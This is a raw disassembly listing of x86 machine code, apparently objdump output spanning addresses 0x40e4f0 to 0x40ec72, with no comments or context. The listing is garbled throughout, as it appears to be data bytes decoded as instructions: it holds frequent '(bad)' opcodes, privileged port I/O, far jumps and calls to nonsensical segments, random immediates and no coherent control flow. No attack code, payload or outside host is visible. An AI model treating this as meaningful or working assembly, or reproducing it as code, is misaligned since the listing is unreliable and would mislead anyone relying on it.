  40e4f0:	js     0x40e48e
  40e4f2:	mov    ds:0xb568a1f2,al
  40e4f7:	stos   BYTE PTR es:[edi],al
  40e4f8:	retf   0x82db
  40e4fb:	dec    eax
  40e4fc:	lods   eax,DWORD PTR ds:[esi]
  40e4fd:	jno    0x40e4f6
  40e4ff:	out    dx,al
  40e500:	push   eax
  40e501:	and    eax,0x3fe06d7f
  40e506:	xchg   edx,eax
  40e507:	jnp    0x40e4c3
  40e509:	sbb    eax,0xbcee1539
  40e50e:	mov    ds:0x542c0b29,eax
  40e513:	(bad)  
  40e514:	sahf   
  40e515:	mov    esi,0x47011675
  40e51a:	ret    
  40e51b:	and    al,0x17
  40e51d:	ss xor ebp,esp
  40e520:	in     al,0xa7
  40e522:	gs out dx,eax
  40e524:	je     0x40e500
  40e526:	sub    DWORD PTR [ebx-0x50],edx
  40e529:	pop    ds
  40e52a:	inc    esi
  40e52b:	outs   dx,BYTE PTR ds:[esi]
  40e52c:	pop    ebp
  40e52d:	nop    eax
  40e530:	adc    BYTE PTR [edx],dh
  40e532:	mov    bh,al
  40e534:	(bad)  [esi+0xc2db897]
  40e53a:	adc    al,0xf7
  40e53c:	sbb    al,0xe8
  40e53e:	xchg   ebx,eax
  40e53f:	ret    0x3c9c
  40e542:	jp     0x40e558
  40e544:	jnp    0x40e55a
  40e546:	(bad)  
  40e547:	xor    eax,0xb9b351f1
  40e54c:	and    esi,edx
  40e54e:	push   esi
  40e54f:	jmp    0x54e6b9cd
  40e554:	cmp    DWORD PTR [ebx],esi
  40e556:	push   cs
  40e557:	lods   al,BYTE PTR ds:[esi]
  40e558:	std    
  40e559:	popa   
  40e55a:	add    eax,0x3fe2b048
  40e55f:	rcl    BYTE PTR [esi-0x7ca35d54],0x43
  40e566:	ds ror dl,0x13
  40e56a:	cmp    bh,BYTE PTR [esi]
  40e56c:	sub    BYTE PTR [edx-0x20],ch
  40e56f:	mov    DWORD PTR [ebp-0x2173cde4],edx
  40e575:	not    DWORD PTR [esi-0x4e]
  40e578:	mov    edi,0xc1371d5f
  40e57d:	data16 or al,0x41
  40e580:	test   DWORD PTR [edi-0x40eb90de],ebx
  40e586:	jb     0x40e57f
  40e588:	into   
  40e589:	inc    edi
  40e58a:	stc    
  40e58b:	push   esi
  40e58c:	retf   
  40e58d:	cld    
  40e58e:	je     0x40e5c7
  40e590:	mov    ecx,0xff98879c
  40e595:	out    0xcd,al
  40e597:	fiadd  DWORD PTR [ebx+edx*4+0x28]
  40e59b:	fs cmp al,0x39
  40e59e:	xor    esp,ecx
  40e5a0:	ins    DWORD PTR es:[edi],dx
  40e5a1:	js     0x40e621
  40e5a3:	xor    al,0x35
  40e5a5:	shl    al,cl
  40e5a7:	push   ebp
  40e5a8:	xchg   esp,eax
  40e5a9:	cli    
  40e5aa:	sub    eax,0xe815544d
  40e5af:	fdiv   QWORD PTR [ecx-0x68e32a84]
  40e5b5:	adc    eax,0x2268de31
  40e5ba:	fadd   st,st(1)
  40e5bc:	xor    DWORD PTR [ebp-0xcf252c6],edx
  40e5c2:	ja     0x40e5d2
  40e5c4:	pop    esi
  40e5c5:	aad    0xb6
  40e5c7:	jnp    0x40e551
  40e5c9:	int    0x7c
  40e5cb:	add    DWORD PTR [esi+0x64],edx
  40e5ce:	xor    BYTE PTR [eax],bl
  40e5d0:	jp     0x40e58b
  40e5d2:	fwait
  40e5d3:	jae    0x40e55e
  40e5d5:	pop    es
  40e5d6:	mov    gs,edx
  40e5d8:	add    ecx,DWORD PTR cs:[edi+ecx*1-0x11912578]
  40e5e0:	adc    al,0x7f
  40e5e2:	loop   0x40e58d
  40e5e4:	mov    ecx,0xd68f074f
  40e5e9:	cli    
  40e5ea:	mov    esi,0x40e071e1
  40e5ef:	cdq    
  40e5f0:	sub    dh,cl
  40e5f2:	add    al,0x86
  40e5f4:	ret    
  40e5f5:	jl     0x40e5c2
  40e5f7:	ins    BYTE PTR es:[edi],dx
  40e5f8:	jle    0x40e5aa
  40e5fa:	adc    esp,eax
  40e5fc:	fstp   TBYTE PTR [edi+0x16]
  40e5ff:	dec    ebx
  40e600:	ret    0xe959
  40e603:	inc    eax
  40e604:	aas    
  40e605:	push   cs
  40e606:	in     al,0xaa
  40e608:	loope  0x40e618
  40e60a:	loop   0x40e5df
  40e60c:	inc    esp
  40e60d:	or     bl,BYTE PTR [ecx]
  40e60f:	int    0x5e
  40e611:	jae    0x40e63a
  40e613:	sub    DWORD PTR [ecx+0x747fd318],0xffffff8f
  40e61a:	jmp    0x9708:0x8f5279dc
  40e621:	jo     0x40e5da
  40e623:	and    eax,0xf614bbb7
  40e628:	shl    DWORD PTR [esi+0x29],cl
  40e62b:	popa   
  40e62c:	ss push ss
  40e62e:	adc    esi,DWORD PTR [esi-0x20]
  40e631:	inc    edx
  40e632:	or     BYTE PTR [esi+0x2e],0x5c
  40e636:	imul   esp,ebx,0x20559be9
  40e63c:	mov    ecx,0x4c3c501c
  40e641:	(bad)  
  40e642:	gs pop edx
  40e644:	inc    eax
  40e645:	xor    ch,BYTE PTR [edi+0x58]
  40e648:	sub    al,0x62
  40e64a:	sub    al,0x78
  40e64c:	rcl    ebp,1
  40e64e:	adc    ch,BYTE PTR ds:0x7821b821
  40e654:	call   0xa647:0x7599f32a
  40e65b:	mov    dl,0x89
  40e65d:	ret    0x83ab
  40e660:	test   DWORD PTR ss:[edi+esi*8-0x5007485f],edx
  40e668:	fwait
  40e669:	jb     0x40e645
  40e66b:	sar    edi,cl
  40e66d:	pop    es
  40e66e:	dec    esi
  40e66f:	push   eax
  40e670:	fiadd  DWORD PTR [ecx-0x731fb47c]
  40e676:	adc    ecx,DWORD PTR [edi+edx*8+0x7b]
  40e67a:	sub    bl,BYTE PTR [edx]
  40e67c:	sbb    bl,BYTE PTR [ecx]
  40e67e:	loop   0x40e682
  40e680:	mov    dh,0x14
  40e682:	dec    ebp
  40e683:	in     al,dx
  40e684:	or     eax,0x1ae51a5c
  40e689:	mov    al,ds:0xfcde66c2
  40e68e:	mov    al,0xa8
  40e690:	dec    eax
  40e691:	(bad)  
  40e692:	out    dx,al
  40e693:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e694:	stos   DWORD PTR es:[edi],eax
  40e695:	add    ebx,DWORD PTR [esi-0x70]
  40e698:	mov    dh,0xe6
  40e69a:	jb     0x40e649
  40e69c:	cwde   
  40e69d:	or     dl,BYTE PTR [eax+0x23]
  40e6a0:	les    ecx,FWORD PTR [esi]
  40e6a2:	lahf   
  40e6a3:	jo     0x40e6b8
  40e6a5:	inc    esp
  40e6a6:	adc    eax,0xdf378d8
  40e6ab:	imul   BYTE PTR [edx]
  40e6ad:	pop    esp
  40e6ae:	lods   al,BYTE PTR ds:[esi]
  40e6af:	iret   
  40e6b0:	cmp    ah,BYTE PTR [ebp-0x79ac2f9b]
  40e6b6:	jmp    0x1f9ecfcc
  40e6bb:	xchg   edi,eax
  40e6bc:	mov    cl,0xc5
  40e6be:	fucom  st(0)
  40e6c0:	popa   
  40e6c1:	pop    ebx
  40e6c2:	and    eax,DWORD PTR [edx+ecx*8]
  40e6c5:	adc    al,0x15
  40e6c7:	shl    BYTE PTR [edx],1
  40e6c9:	ds pop edx
  40e6cb:	sbb    al,0x1f
  40e6cd:	add    eax,0xbd703a83
  40e6d2:	sub    BYTE PTR [ebx-0x12],0x5c
  40e6d6:	or     ch,bl
  40e6d8:	jbe    0x40e72b
  40e6da:	push   esp
  40e6db:	fs jg  0x40e664
  40e6de:	jle    0x40e67a
  40e6e0:	and    eax,0xcbd51028
  40e6e5:	cmc    
  40e6e6:	call   0x198eb490
  40e6eb:	inc    ecx
  40e6ec:	mov    edx,0x72f48b68
  40e6f1:	sub    eax,0xd9fddf72
  40e6f6:	cmp    eax,0x19ce428b
  40e6fb:	popf   
  40e6fc:	pop    ss
  40e6fd:	(bad)  
  40e6fe:	js     0x40e6f2
  40e700:	xor    DWORD PTR [ebp+0x5],ecx
  40e703:	cmp    esi,ebp
  40e705:	rcl    DWORD PTR [esi-0xd],0x74
  40e709:	add    al,bh
  40e70b:	(bad)  
  40e70c:	sub    DWORD PTR [edi+0x57fc367a],edi
  40e712:	add    bl,BYTE PTR [eax+ebp*4+0x56]
  40e716:	or     al,0xd5
  40e718:	pop    ds
  40e719:	enter  0x308a,0x81
  40e71d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e71e:	fsubr  DWORD PTR ds:0xf6597e35
  40e724:	lahf   
  40e725:	int    0xf4
  40e727:	or     DWORD PTR [edi],esp
  40e729:	adc    eax,0x6e54ad31
  40e72e:	ds push ecx
  40e730:	xor    BYTE PTR [edi+0x4c37284f],dh
  40e736:	(bad)  
  40e737:	jecxz  0x40e771
  40e739:	or     al,0x3d
  40e73b:	shr    DWORD PTR [esi-0x53],cl
  40e73e:	jle    0x40e727
  40e740:	mov    esp,0x6d046b1e
  40e745:	out    dx,eax
  40e746:	and    al,0xd6
  40e748:	xchg   edx,eax
  40e749:	jle    0x40e792
  40e74b:	add    DWORD PTR [edi+0x4441c183],0xcc46296f
  40e755:	jmp    0x40bc7f6e
  40e75a:	ret    0xf5de
  40e75d:	add    DWORD PTR [esi],edx
  40e75f:	jbe    0x40e7af
  40e761:	sbb    BYTE PTR [edi],ah
  40e763:	cs and al,0x18
  40e766:	dec    eax
  40e767:	and    BYTE PTR [ecx+0x6175a512],bh
  40e76d:	pusha  
  40e76e:	xor    ebx,0x6a
  40e771:	in     eax,dx
  40e772:	fbstp  TBYTE PTR [ecx+ecx*2]
  40e775:	scas   eax,DWORD PTR es:[edi]
  40e776:	add    eax,0xbef50e20
  40e77b:	sbb    al,0xf
  40e77d:	dec    esi
  40e77e:	mov    dh,0x6f
  40e780:	xor    dl,0x48
  40e783:	scas   al,BYTE PTR es:[edi]
  40e784:	dec    eax
  40e785:	aas    
  40e786:	adc    dl,dl
  40e788:	xor    BYTE PTR [eax+0x2d],0x6b
  40e78c:	outs   dx,BYTE PTR ds:[esi]
  40e78d:	add    DWORD PTR [eax-0x77],0xffffffb4
  40e791:	add    DWORD PTR [ebx],edi
  40e793:	jmp    0x3a4f:0x19d8bcd8
  40e79a:	add    DWORD PTR [eax],ebx
  40e79c:	inc    ebx
  40e79d:	push   0xffffffb5
  40e79f:	mov    ch,0xd5
  40e7a1:	xor    eax,0x878aafa7
  40e7a6:	ins    BYTE PTR es:[edi],dx
  40e7a7:	push   0xbfb58c8f
  40e7ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7ad:	scas   eax,DWORD PTR es:[edi]
  40e7ae:	mov    dl,0x5e
  40e7b0:	xchg   esi,eax
  40e7b1:	loope  0x40e765
  40e7b3:	adc    BYTE PTR [ebx],ch
  40e7b5:	dec    edi
  40e7b6:	gs pushf 
  40e7b8:	mov    dl,0xce
  40e7ba:	mov    ds:0x54ede5f9,eax
  40e7bf:	ss in  eax,dx
  40e7c1:	test   eax,0xc9630e3
  40e7c6:	mov    eax,0xc0b32cce
  40e7cb:	sub    DWORD PTR [ebp-0x2fc1680c],0x1b908145
  40e7d5:	sub    DWORD PTR [esi],esp
  40e7d7:	adc    ecx,edi
  40e7d9:	sub    edx,DWORD PTR [edx-0x7f797af]
  40e7df:	push   cs
  40e7e0:	retf   
  40e7e1:	loop   0x40e76d
  40e7e3:	xchg   edx,eax
  40e7e4:	ins    DWORD PTR es:[edi],dx
  40e7e5:	jge    0x40e815
  40e7e7:	(bad)  
  40e7e8:	imul   ebp,DWORD PTR [ecx+0x4a],0x4a
  40e7ec:	clc    
  40e7ed:	add    al,0xfc
  40e7ef:	stc    
  40e7f0:	push   esi
  40e7f1:	cli    
  40e7f2:	sbb    eax,DWORD PTR [ecx]
  40e7f4:	sbb    DWORD PTR [eax+0x3b],edi
  40e7f7:	sbb    DWORD PTR [ecx-0x7c],eax
  40e7fa:	stos   BYTE PTR es:[edi],al
  40e7fb:	xchg   esp,eax
  40e7fc:	ret    
  40e7fd:	shl    DWORD PTR [edx],1
  40e7ff:	outs   dx,DWORD PTR ds:[esi]
  40e800:	lods   eax,DWORD PTR ds:[esi]
  40e801:	jl     0x40e877
  40e803:	sbb    edx,DWORD PTR [ecx]
  40e805:	mov    dh,0xa7
  40e807:	cdq    
  40e808:	popa   
  40e809:	cmp    BYTE PTR [ecx+edi*2+0xa],bh
  40e80d:	sbb    bh,0x1e
  40e810:	test   dh,al
  40e812:	int    0xb
  40e814:	dec    ecx
  40e815:	(bad)  
  40e816:	sti    
  40e817:	sub    BYTE PTR [ebx+ecx*4+0x4b],dh
  40e81b:	xor    edi,DWORD PTR [edi-0x77aff38a]
  40e821:	jnp    0x40e807
  40e823:	ret    0x2a13
  40e826:	call   0x7d10:0xaa58040a
  40e82d:	xor    eax,0x2f7ce0d5
  40e833:	inc    bx
  40e835:	imul   edi,eax,0x32
  40e838:	xchg   esi,eax
  40e839:	aad    0x8c
  40e83b:	adc    DWORD PTR [esi],edx
  40e83d:	dec    edi
  40e83e:	mov    dl,0xc1
  40e840:	(bad)  [ebp-0x5a]
  40e843:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e844:	inc    eax
  40e845:	mov    eax,0xba77d0fe
  40e84a:	sub    dh,BYTE PTR [eax]
  40e84c:	out    0x8b,al
  40e84e:	xor    eax,DWORD PTR [esi+0x68813eb2]
  40e854:	btc    DWORD PTR [edi-0x4e5a6ff0],edi
  40e85b:	addr16 aas 
  40e85d:	fs inc edx
  40e85f:	xchg   ebx,eax
  40e860:	pusha  
  40e861:	pop    ebp
  40e862:	add    edx,edi
  40e864:	cmp    dh,dl
  40e866:	mov    ah,0x2a
  40e868:	push   esp
  40e869:	lods   al,BYTE PTR ds:[esi]
  40e86a:	dec    esi
  40e86b:	pop    edi
  40e86c:	jo     0x40e8c4
  40e86e:	push   DWORD PTR [ebp-0x3f010d7e]
  40e874:	loop   0x40e841
  40e876:	fs mov ch,0x24
  40e879:	or     eax,0x1404dd8b
  40e87e:	mov    bh,0xe5
  40e880:	adc    BYTE PTR [edi-0x37],bl
  40e883:	push   ds
  40e884:	mov    edx,0x5964c52c
  40e889:	push   eax
  40e88a:	cld    
  40e88b:	test   BYTE PTR [ebp+0x54deef42],dl
  40e891:	or     esp,DWORD PTR [ebx-0x67221f8a]
  40e897:	(bad)  
  40e898:	adc    DWORD PTR [ebx-0x30d43ac0],eax
  40e89e:	adc    eax,0xe0a021ac
  40e8a3:	xchg   ebx,eax
  40e8a4:	mov    esi,0x52f9da54
  40e8a9:	shl    BYTE PTR [ecx],1
  40e8ab:	adc    BYTE PTR ds:0x94d1a124,0xc3
  40e8b2:	ss sub eax,0x2cddc92e
  40e8b8:	jae    0x40e851
  40e8ba:	in     al,dx
  40e8bb:	xchg   ecx,eax
  40e8bc:	int3   
  40e8bd:	shl    BYTE PTR ss:[edx+0xf237303],0xf3
  40e8c5:	and    esi,DWORD PTR [ebp+0x149a80c1]
  40e8cb:	and    ebp,ebx
  40e8cd:	jge    0x40e8db
  40e8cf:	sbb    al,0x75
  40e8d1:	int3   
  40e8d2:	inc    ebx
  40e8d3:	arpl   WORD PTR [ecx+0xe],sp
  40e8d6:	sbb    ah,al
  40e8d8:	ds and esi,edx
  40e8db:	mov    edi,esi
  40e8dd:	xor    edi,0x6e
  40e8e0:	cld    
  40e8e1:	cmp    eax,0x94034779
  40e8e6:	in     al,0x7a
  40e8e8:	jge    0x40e956
  40e8ea:	arpl   WORD PTR [eax],ax
  40e8ec:	and    eax,0x9f953e6d
  40e8f1:	sub    eax,0x246fc586
  40e8f6:	cmp    ch,BYTE PTR [edx-0x7b5df5f]
  40e8fc:	mov    esp,0x7c207443
  40e901:	push   es
  40e902:	pop    ebp
  40e903:	xor    ecx,DWORD PTR [eax+0x244af60c]
  40e909:	in     al,0x2e
  40e90b:	test   DWORD PTR [ebp+ebp*1+0x5e],0x76e8dd4
  40e913:	add    eax,0xc1db9411
  40e918:	push   esp
  40e919:	fwait
  40e91a:	fwait
  40e91b:	xor    al,0xa0
  40e91d:	fidiv  DWORD PTR [ebx]
  40e91f:	push   0xce8a8512
  40e924:	in     eax,dx
  40e925:	or     BYTE PTR ds:0x282b2680,bl
  40e92b:	fld    TBYTE PTR [ebx+0x74]
  40e92e:	sbb    DWORD PTR [esi-0x40b3c71b],0xa9190534
  40e938:	jmp    0xa56e:0x99828177
  40e93f:	jbe    0x40e972
  40e941:	mov    dh,0x43
  40e943:	and    al,0x69
  40e945:	or     DWORD PTR [ecx],ebp
  40e947:	mov    esi,0x68c7bcba
  40e94c:	xchg   BYTE PTR [edi-0x1d],ch
  40e94f:	addr16 repz cmc 
  40e952:	(bad)  
  40e953:	(bad)  
  40e955:	dec    ebx
  40e956:	into   
  40e957:	inc    ebx
  40e958:	sbb    BYTE PTR [edi-0x23],dh
  40e95b:	leave  
  40e95c:	and    DWORD PTR ds:0xbe2f28e5,esp
  40e962:	cmp    esi,DWORD PTR [eax]
  40e964:	add    al,0x69
  40e966:	inc    esp
  40e967:	repz fcmovnu st,st(2)
  40e96a:	pop    ebx
  40e96b:	div    al
  40e96d:	fcom   DWORD PTR [ebp+0x5db77f15]
  40e973:	cdq    
  40e974:	dec    esi
  40e975:	xor    BYTE PTR [edi-0x358cb4a3],dh
  40e97b:	cmp    DWORD PTR [edi],esp
  40e97d:	pop    esp
  40e97e:	dec    ebp
  40e97f:	xor    al,0x70
  40e981:	(bad)  
  40e982:	push   edi
  40e983:	or     esp,ebp
  40e985:	adc    edx,DWORD PTR [esi+0x12]
  40e988:	jb     0x40e98f
  40e98a:	push   ebp
  40e98b:	mov    al,ds:0x246b5557
  40e990:	fild   QWORD PTR [esp+edx*1-0x29]
  40e994:	neg    DWORD PTR [edi-0x4f]
  40e997:	cmc    
  40e998:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e999:	mov    WORD PTR [eax+0x3cb55e64],ds
  40e99f:	adc    BYTE PTR [ecx-0x30137cce],ch
  40e9a5:	iret   
  40e9a6:	scas   al,BYTE PTR es:[edi]
  40e9a7:	sti    
  40e9a8:	(bad)  
  40e9a9:	pop    ebx
  40e9aa:	outs   dx,BYTE PTR ds:[esi]
  40e9ab:	dec    esp
  40e9ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e9ad:	jbe    0x40e96a
  40e9af:	xlat   BYTE PTR ds:[ebx]
  40e9b0:	repnz into 
  40e9b2:	adc    al,0x38
  40e9b4:	jmp    0xcf3a:0x1282505
  40e9bb:	pop    ebx
  40e9bc:	daa    
  40e9bd:	mov    ds:0x8e88985a,eax
  40e9c2:	xchg   edx,eax
  40e9c3:	inc    esi
  40e9c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9c5:	popa   
  40e9c6:	and    BYTE PTR [ebp-0x40ecb8b9],0x92
  40e9cd:	mov    ebx,0x18ed54ba
  40e9d2:	pop    ss
  40e9d3:	je     0x40e9ae
  40e9d5:	and    ebx,DWORD PTR [edx-0x3c]
  40e9d8:	sub    al,BYTE PTR [edx-0x866eef2]
  40e9de:	sub    ebp,DWORD PTR [eax]
  40e9e0:	test   al,0x6f
  40e9e2:	and    eax,0x3dfb18d5
  40e9e7:	xlat   BYTE PTR ds:[ebx]
  40e9e8:	xchg   ecx,eax
  40e9e9:	(bad)  
  40e9eb:	popf   
  40e9ec:	das    
  40e9ed:	xchg   esp,eax
  40e9ee:	push   esp
  40e9ef:	dec    eax
  40e9f0:	out    0xc3,al
  40e9f2:	inc    ecx
  40e9f3:	jne    0x40e9d4
  40e9f5:	es push ebx
  40e9f7:	popf   
  40e9f8:	push   esp
  40e9f9:	cmp    eax,0xd2783381
  40e9fe:	dec    eax
  40e9ff:	jb     0x40ea6a
  40ea01:	sub    eax,0x441ae6b7
  40ea06:	lea    esp,[ecx-0x73504078]
  40ea0c:	xlat   BYTE PTR ds:[ebx]
  40ea0d:	retf   0x61c4
  40ea10:	ins    BYTE PTR es:[edi],dx
  40ea11:	gs dec esi
  40ea13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea14:	sti    
  40ea15:	pop    es
  40ea16:	ins    DWORD PTR es:[edi],dx
  40ea17:	or     DWORD PTR fs:[edi+0x124e0c4c],esi
  40ea1e:	mov    gs,WORD PTR [edx]
  40ea20:	sub    al,0x32
  40ea22:	mov    BYTE PTR [ebx-0x75],bl
  40ea25:	sub    eax,0x68caa0fb
  40ea2a:	out    dx,eax
  40ea2b:	out    dx,al
  40ea2c:	sub    esp,esi
  40ea2e:	mov    eax,0x7e98097b
  40ea33:	sub    al,0xaa
  40ea35:	add    BYTE PTR [ebp-0x5a],ch
  40ea38:	adc    esp,ecx
  40ea3a:	test   bh,cl
  40ea3c:	inc    ecx
  40ea3d:	jle    0x40eaae
  40ea3f:	imul   ecx,DWORD PTR [ecx],0x4aab1c40
  40ea45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea46:	push   cs
  40ea47:	lock add ebx,DWORD PTR [ecx-0x7b]
  40ea4b:	cdq    
  40ea4c:	cmp    BYTE PTR [edi+0x1fa370a0],ch
  40ea52:	pop    es
  40ea53:	xchg   ebp,eax
  40ea54:	or     al,0xa
  40ea56:	test   esi,esi
  40ea58:	mov    dh,0xd7
  40ea5a:	adc    DWORD PTR [edx-0x14],esi
  40ea5d:	clc    
  40ea5e:	fld    DWORD PTR [eax]
  40ea60:	add    BYTE PTR [ebp+0x7b],bh
  40ea63:	sub    DWORD PTR [eax-0x630add05],edi
  40ea69:	fistp  WORD PTR [edi+0x2feee60e]
  40ea6f:	push   ebp
  40ea70:	xchg   ebx,eax
  40ea71:	adc    DWORD PTR [ecx],edx
  40ea73:	cmp    edx,DWORD PTR [ebx+0x3]
  40ea76:	push   ebx
  40ea77:	shl    edi,1
  40ea79:	hlt    
  40ea7a:	pop    ebx
  40ea7b:	or     DWORD PTR [edx+0x5a91c0d9],ebx
  40ea81:	push   ds
  40ea82:	loope  0x40eaf9
  40ea84:	pop    esp
  40ea85:	fisub  DWORD PTR [ebx]
  40ea87:	retf   
  40ea88:	mov    al,0x8f
  40ea8a:	mov    DWORD PTR [esi+0x500e60e3],ebp
  40ea90:	fisttp DWORD PTR ds:0xd901f747
  40ea96:	pop    eax
  40ea97:	repz dec esi
  40ea99:	jb     0x40ea86
  40ea9b:	jae    0x40ea44
  40ea9d:	dec    ebx
  40ea9e:	push   esp
  40ea9f:	mov    edx,0xdbaba869
  40eaa4:	in     eax,dx
  40eaa5:	in     al,0xbb
  40eaa7:	push   ebx
  40eaa8:	das    
  40eaa9:	mov    BYTE PTR [edx+0x27626f5a],bh
  40eaaf:	lods   al,BYTE PTR ds:[esi]
  40eab0:	stos   DWORD PTR es:[edi],eax
  40eab1:	inc    ebx
  40eab2:	mov    cl,0xf7
  40eab4:	pop    eax
  40eab5:	dec    esp
  40eab6:	cdq    
  40eab7:	xor    al,BYTE PTR [ebx+0x5206bb90]
  40eabd:	xchg   esi,ebx
  40eabf:	mov    ch,0xe0
  40eac1:	mov    ch,0xd1
  40eac3:	js     0x40eb28
  40eac5:	jnp    0x40ead3
  40eac7:	sbb    DWORD PTR [ecx-0x7e],0x121460ed
  40eace:	test   eax,0xc733b937
  40ead3:	xchg   esi,eax
  40ead4:	(bad)  
  40ead5:	ficom  DWORD PTR [ecx]
  40ead7:	fstp   TBYTE PTR [esi-0x43]
  40eada:	aas    
  40eadb:	hlt    
  40eadc:	jge    0x40ea97
  40eade:	push   edi
  40eadf:	adc    al,0x23
  40eae1:	or     bl,0x86
  40eae4:	sahf   
  40eae5:	imul   ebx,DWORD PTR [edi],0x35
  40eae8:	or     bl,bh
  40eaea:	cmp    al,0x36
  40eaec:	out    dx,eax
  40eaed:	(bad)  
  40eaee:	cwde   
  40eaef:	sub    esp,DWORD PTR [esi]
  40eaf1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eaf2:	mov    esi,0x5200a667
  40eaf7:	int3   
  40eaf8:	in     eax,0xc3
  40eafa:	fs xchg edx,eax
  40eafc:	pop    ds
  40eafd:	mov    esp,DWORD PTR [ebp+0x24bd3600]
  40eb03:	enter  0xe6cc,0xbc
  40eb07:	xchg   BYTE PTR [ecx-0x1f],bh
  40eb0a:	pop    ebx
  40eb0b:	test   bl,bh
  40eb0d:	dec    edi
  40eb0e:	mov    WORD PTR [ebp+0x7dc7bd1f],?
  40eb14:	adc    ebx,DWORD PTR [ebx+0x33]
  40eb17:	shr    DWORD PTR [edi+0x37],cl
  40eb1a:	loop   0x40eac2
  40eb1c:	inc    esi
  40eb1d:	arpl   sp,cx
  40eb1f:	sti    
  40eb20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb21:	jne    0x40eabe
  40eb23:	stc    
  40eb24:	add    eax,0xa428acc7
  40eb29:	sbb    al,0x48
  40eb2b:	push   edx
  40eb2c:	cmp    al,0xaa
  40eb2e:	cli    
  40eb2f:	xchg   edi,eax
  40eb30:	and    BYTE PTR [eax+ebp*2-0x5e],ah
  40eb34:	dec    edi
  40eb35:	adc    eax,0x2ae47161
  40eb3a:	out    0xf0,eax
  40eb3c:	xor    BYTE PTR [ebp-0x261f83a7],dh
  40eb42:	push   0xffffff9f
  40eb44:	xchg   DWORD PTR [eax+0x30a0e02d],ebp
  40eb4a:	sub    cl,BYTE PTR [esi]
  40eb4c:	xchg   ebp,eax
  40eb4d:	js     0x40eb8a
  40eb4f:	test   ebp,ebp
  40eb51:	jmp    0x3a4f0762
  40eb56:	hlt    
  40eb57:	in     al,dx
  40eb58:	leave  
  40eb59:	cmp    eax,0xf2b32d98
  40eb5e:	outs   dx,DWORD PTR ds:[esi]
  40eb5f:	and    cl,0x3e
  40eb62:	xchg   esi,eax
  40eb63:	mov    bh,0x39
  40eb65:	pushf  
  40eb66:	jne    0x40ebd2
  40eb68:	push   ebx
  40eb69:	jno    0x40eb2e
  40eb6b:	mov    ds:0x26c4b6be,al
  40eb70:	cld    
  40eb71:	jmp    0x40eb6e
  40eb73:	push   edi
  40eb74:	dec    esp
  40eb75:	and    ebx,DWORD PTR [edx]
  40eb77:	push   ecx
  40eb78:	inc    eax
  40eb79:	imul   edx,DWORD PTR [ebx-0xa6f4159],0x5ffaf031
  40eb83:	jle    0x40eb06
  40eb85:	test   DWORD PTR [ebx-0x40],eax
  40eb88:	mov    esp,0xba8b6358
  40eb8d:	stos   BYTE PTR es:[edi],al
  40eb8e:	out    dx,eax
  40eb8f:	mov    cl,0xe7
  40eb91:	aaa    
  40eb92:	sub    dl,BYTE PTR [edi-0x77b0aac1]
  40eb98:	loop   0x40eb6f
  40eb9a:	mov    ah,0x8a
  40eb9c:	imul   edx,DWORD PTR [edi-0x5f163918],0x8d031fd8
  40eba6:	retf   
  40eba7:	jo     0x40eb30
  40eba9:	arpl   WORD PTR [esi],dx
  40ebab:	out    0x8c,al
  40ebad:	not    BYTE PTR [eiz*8-0x2f25a67b]
  40ebb4:	fs addr16 sahf 
  40ebb7:	out    dx,eax
  40ebb8:	jle    0x40ec26
  40ebba:	jno    0x40ec13
  40ebbc:	imul   ebx,DWORD PTR [eax-0x17],0x433023cd
  40ebc3:	jge    0x40eb9d
  40ebc5:	mov    ebp,0x8f9b41d7
  40ebca:	(bad)  
  40ebcb:	jbe    0x40ec38
  40ebcd:	adc    dh,dh
  40ebcf:	arpl   di,si
  40ebd1:	imul   DWORD PTR [ebp+0x39dae4f1]
  40ebd7:	xchg   edx,eax
  40ebd8:	test   eax,0x98f7b3fd
  40ebdd:	sub    eax,0xdb98569f
  40ebe2:	ficom  WORD PTR [edx]
  40ebe4:	imul   esi,DWORD PTR [edx+0x71],0xa485b3ec
  40ebeb:	std    
  40ebec:	jge    0x40ebf7
  40ebee:	xor    eax,0x8f84fbf9
  40ebf3:	or     BYTE PTR [eax+0xc],dh
  40ebf6:	push   esi
  40ebf7:	and    al,0x60
  40ebf9:	retf   0x64c8
  40ebfc:	mov    esp,0xcc70d893
  40ec01:	cdq    
  40ec02:	retf   
  40ec03:	cmp    DWORD PTR [ebp-0x5f],esi
  40ec06:	dec    eax
  40ec07:	push   edx
  40ec08:	sbb    eax,0x87858c29
  40ec0d:	fxtract 
  40ec0f:	cmp    ch,BYTE PTR [eax+eiz*8]
  40ec12:	xor    ah,BYTE PTR [ecx+0x26164dad]
  40ec18:	jge    0x40ebf7
  40ec1a:	popf   
  40ec1b:	sbb    eax,0xff349053
  40ec20:	adc    DWORD PTR [edx+ebx*4],0xa4e5b9fe
  40ec27:	iret   
  40ec28:	mov    bl,0x94
  40ec2a:	sbb    DWORD PTR [ebp+0x66],0xffffffe1
  40ec2e:	int3   
  40ec2f:	fld    DWORD PTR [eax]
  40ec31:	retf   
  40ec32:	std    
  40ec33:	xor    bl,BYTE PTR [ecx-0x3e]
  40ec36:	dec    ecx
  40ec37:	jnp    0x40ecb7
  40ec39:	ret    0x4f17
  40ec3c:	add    DWORD PTR [edi-0x59],esp
  40ec3f:	loopne 0x40ec8d
  40ec41:	jmp    DWORD PTR [eax-0x4b34588c]
  40ec47:	and    al,0x56
  40ec49:	out    0xdb,al
  40ec4b:	inc    ecx
  40ec4c:	cdq    
  40ec4d:	mov    esi,0xcc6095f9
  40ec52:	pop    ebx
  40ec53:	test   BYTE PTR [edi-0x422df19c],cl
  40ec59:	fimul  DWORD PTR [esi+esi*8+0x7c]
  40ec5d:	cmp    al,0xf1
  40ec5f:	leave  
  40ec60:	xor    BYTE PTR [ebx],dh
  40ec62:	icebp  
  40ec63:	mov    bl,0x40
  40ec65:	mov    ds:0xcb314209,al
  40ec6a:	dec    edx
  40ec6b:	xor    al,0x44
  40ec6d:	adc    eax,0x9099ea41
  40ec72:	in     al,dx
